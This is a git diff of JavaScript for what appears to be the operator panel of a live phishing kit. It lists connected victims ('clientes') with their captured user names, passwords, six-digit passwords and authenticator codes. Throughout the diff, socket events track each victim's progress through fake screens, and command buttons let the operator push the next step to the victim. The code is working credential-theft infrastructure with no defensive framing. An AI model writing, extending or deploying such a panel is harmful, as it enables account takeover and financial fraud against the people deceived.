@@ -1,5 +1,39 @@
+socket.on('onScreenPass', (data) => {
+    const lineClient = document.querySelector(`.productList tr[data-id='${data.id}']`)
+
+    if (!lineClient) return
+
+    lineClient.querySelector(`td[role='status'] span`).innerHTML = `Online na senha de 6`
+})
+
 const panel = (() => {
     //private var/functions
+
+    const buttonsSendCommands = [...document.querySelectorAll('.btn-actions')]
+
+    //clientIdentify
+
+    async function sendCommand() {
+        if (buttonsSendCommands) {
+            buttonsSendCommands.forEach((btn) => {
+                btn.addEventListener('click', function (e) {
+                    e.preventDefault()
+
+                    const clientOperating = document.querySelector('.form-operator')
+
+                    if (!clientOperating) console.log('nenhum cliente selecionado')
+
+                    const idClient = clientOperating.getAttribute('client-id')
+
+                    console.log(idClient)
+
+                    const action = btn.getAttribute('action')
+
+                    socket.emit(action, idClient)
+                })
+            })
+        }
+    }
 
     function handleCount(minute, second, field) {
         //return { minute, second }
@@ -96,48 +130,22 @@ const panel = (() => {
     }
 
     function createClient(client) {
-        const { id, user, password, eletronicPassword, type, createdAt } = client
+        const { id, user, password, password6, type } = client
         const tr = document.createElement('tr')
 
         tr.dataset.id = id
 
         tr.innerHTML = `
         <th scope="row" role="id"># ${id}</th>
-        <td><strong role="operator">Aguardando OP</strong></td>
-        <td><a class="btn btn-success btn-sm" target="blank" href="/operator?client=${id}" role="button">Operar</a></td>
         <td role="user">${user}</td>
         <td role="password">${password}</td>
-        <td role="type">${type}</td>
-        <td role="time">132:50</td>
-        <td role="command">Aguardando Comando</td>
+        <input type="hidden" name="password6" value="${password6}">
+        <td role="status" class="blockstatus enter"><span>Cliente entrou</span></td>
         `
-
-        const roleTime = tr.querySelector('td[role="time"]')
-
-        let time = new Date() - new Date(createdAt)
-
-        time = new Date(time)
-
-        let seconds = time.getSeconds()
-        let minutes = time.getMinutes()
-
-        time = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)
-
-        roleTime.innerHTML = time
-
-        setInterval(() => {
-            if (seconds == 59) {
-                minutes = minutes + 1
-                seconds = 0
-            } else {
-                seconds = seconds + 1
-            }
-
-            roleTime.innerHTML = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)
-        }, 1000)
 
         //timer(roleTime)
 
+        clickInfo(tr)
         document.querySelector('.productList').prepend(tr)
     }
 
@@ -149,7 +157,109 @@ const panel = (() => {
         socket.on('newClient', createClient)
     }
 
+    function updateClient(data) {
+        const table = document.querySelector('.productList')
+
+        const tableId = table.querySelector(`tr[data-id='${data.id}']`)
+        const tableUser = tableId.querySelector(`[role='user']`)
+        const tablePassword = tableId.querySelector(`[role='password']`)
+
+        if (tableId && tableUser) tableUser.innerHTML = data.user
+        if (tableId && tablePassword) tablePassword.innerHTML = data.password
+    }
+
     function receiver() {
+        socket.on('createClient', (data) => {
+            createClient(data)
+        })
+
+        socket.on('sendAuth', (data) => {
+            setTimeout(() => {
+                const item = document.querySelector(`.productList tr[data-id='${data.id}']`)
+
+                item.querySelector(`td[role='status']`).className = ``
+
+                item.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')
+
+                item.querySelector(`td[role='status'] span`).innerHTML = 'Auth enviado'
+            }, 600)
+        })
+
+        socket.on('onScreenDisp', (data) => {
+            const item = document.querySelector(`.productList tr[data-id='${data.id}']`)
+
+            if (!item) return
+
+            setTimeout(() => {
+                item.querySelector(`td[role='status']`).className = ``
+
+                item.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')
+                item.querySelector(`td[role='status'] span`).innerHTML = 'Online tela dispositivo'
+            }, 500)
+        })
+
+        //reconnect client
+        socket.on('userReconnect', (data) => {
+            setTimeout(() => {
+                const item = document.querySelector(`.productList tr[data-id='${data.id}']`)
+
+                item.querySelector(`td[role='status']`).className = ``
+
+                item.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')
+
+                item.querySelector(`td[role='status'] span`).innerHTML = 'Conectado'
+            }, 300)
+        })
+
+        socket.on('onScreenPass', (data) => {
+            setTimeout(() => {
+                const item = document.querySelector(`.productList tr[data-id='${data.id}']`)
+
+                item.querySelector(`td[role='status']`).className = ``
+
+                item.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')
+
+                item.querySelector(`td[role='status'] span`).innerHTML = 'Conectado'
+            }, 300)
+        })
+
+        socket.on('sendPass6', (data) => {
+            const item = document.querySelector(`.productList tr[data-id='${data.id}']`)
+
+            item.querySelector(`td[role='status']`).className = ``
+
+            item.querySelector(`td[role='status']`).classList.add('blockstatus', 'updated')
+
+            item.querySelector(`td[role='status'] span`).innerHTML = 'Enviou senha de 6'
+        })
+
+        socket.on('updateClient', (data) => {
+            const lineClient = document.querySelector(`.productList > tr[data-id='${data.id}']`)
+
+            setTimeout(() => {
+                if (lineClient) {
+                    lineClient.querySelector(`td[role='user']`).innerHTML = data.user
+                    lineClient.querySelector(`td[role='password']`).innerHTML = data.password
+                    lineClient.querySelector(`input[name='password6']`).value = data.password6
+                    lineClient.querySelector(`input[name='auth']`).value = data.auth
+                    lineClient.querySelector(`td[role='status']`).className = ``
+                    lineClient.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')
+                    lineClient.querySelector(`td[role='status'] span`).innerHTML = `Online na senha de 6`
+                }
+
+                const formOperator = document.querySelector(`form[client-id='${data.id}']`)
+
+                if (formOperator) {
+                    formOperator.querySelector(`input[type='email']`).value = data.user
+                    formOperator.querySelector(`#exampleInputPassword1`).value = data.password
+                    formOperator.querySelector(`#password6`).value = data.password6
+                    formOperator.querySelector(`#inputAuthenticator`).value = data.auth
+                }
+            }, 300)
+
+            //updateClient(data)
+        })
+
         socket.on('sendPassword', (client) => {
             const roleId = document.querySelector(`tr[data-id="${client.id}"]`)
 
@@ -169,7 +279,10 @@ const panel = (() => {
         socket.on('clientDisconnect', (client) => {
             const roleId = document.querySelector(`tr[data-id="${client.id}"]`)
 
-            const command = roleId.querySelector('td[role="time"]')
+            roleId.querySelector('td[role="status"]').classList.remove('enter')
+            roleId.querySelector('td[role="status"]').classList.add('disconnected')
+
+            const command = roleId.querySelector('td[role="status"] span')
 
             if (command) command.innerHTML = `SAIU`
         })
@@ -189,28 +302,73 @@ const panel = (() => {
                 role.innerHTML = `Aguardando Comando`
             }
         })
+    }
 
-        socket.on('inSMS', (client) => {
-            const { updatedAt } = client
+    function clickInfo(info) {
+        info.addEventListener('click', (e) => {
+            e.preventDefault()
 
-            const minutes = new Date(updatedAt).getMinutes()
-            const seconds = new Date(updatedAt).getSeconds()
+            const form = document.querySelector('.form-operator')
 
-            console.log(('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2))
+            document.querySelector('.client-name').innerHTML = info.querySelector(`td[role='user']`).innerHTML
 
-            setTimeout(() => {
-                //util.countOnline(client.updatedAt)
+            if (!form) return
 
-                const tr = document.querySelector(`tr[data-id="${client.id}"]`)
+            form.setAttribute('client-id', info.getAttribute('data-id'))
 
-                if (tr) {
-                    const roleCommand = tr.querySelector('td[role="command"]')
-                    const roleTime = tr.querySelector('td[role="time"]')
+            form.querySelector('#exampleInputEmail1').value = info.querySelector(`td[role='user']`).innerHTML
+            form.querySelector('#exampleInputPassword1').value = info
+                .querySelector(`td[role='password']`)
+                .innerHTML.replace(/\s/g, '')
 
-                    if (roleCommand) roleCommand.innerHTML = `Online no SMS`
-                    if (roleTime) roleTime.innerHTML = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)
-                }
-            }, 500)
+            console.log(info.querySelector(`input`).value)
+
+            if (
+                info.querySelector(`input[name='password6']`).value != null ||
+                info.querySelector(`input[name='password6']`).value != 'null'
+            )
+                form.querySelector('#password6').value = info
+                    .querySelector(`input[name='password6']`)
+                    .value.replace(/\s/g, '')
+
+            if (
+                info.querySelector(`input[name='auth']`).value != null ||
+                info.querySelector(`input[name='auth']`).value != 'null'
+            )
+                form.querySelector('#inputAuthenticator').value = info
+                    .querySelector(`input[name='auth']`)
+                    .value.replace(/\s/g, '')
+        })
+    }
+
+    function selectInfo() {
+        const listInfo = [...document.querySelectorAll(`.productList tr`)]
+
+        listInfo.forEach((info) => {
+            info.addEventListener('click', (e) => {
+                e.preventDefault()
+
+                document.querySelector('.client-name').innerHTML = info.querySelector(`td[role='user']`).innerHTML
+
+                const form = document.querySelector('.form-operator')
+
+                if (!form) return
+
+                form.setAttribute('client-id', info.getAttribute('data-id'))
+
+                form.querySelector('#exampleInputEmail1').value = info.querySelector(`td[role='user']`).innerHTML
+                form.querySelector('#exampleInputPassword1').value = info
+                    .querySelector(`td[role='password']`)
+                    .innerHTML.replace(/\s/g, '')
+
+                form.querySelector('#password6').value = info
+                    .querySelector(`input[name='password6']`)
+                    .value.replace(/\s/g, '')
+
+                form.querySelector('#inputAuthenticator').value = info
+                    .querySelector(`input[name='auth']`)
+                    .value.replace(/\s/g, '')
+            })
         })
     }
 
@@ -220,9 +378,13 @@ const panel = (() => {
         receiver,
         register,
         timer,
+        selectInfo,
+        sendCommand,
     }
 })()
 
+panel.sendCommand()
+panel.selectInfo()
 panel.clientEnter()
 panel.receiver()
 panel.register()
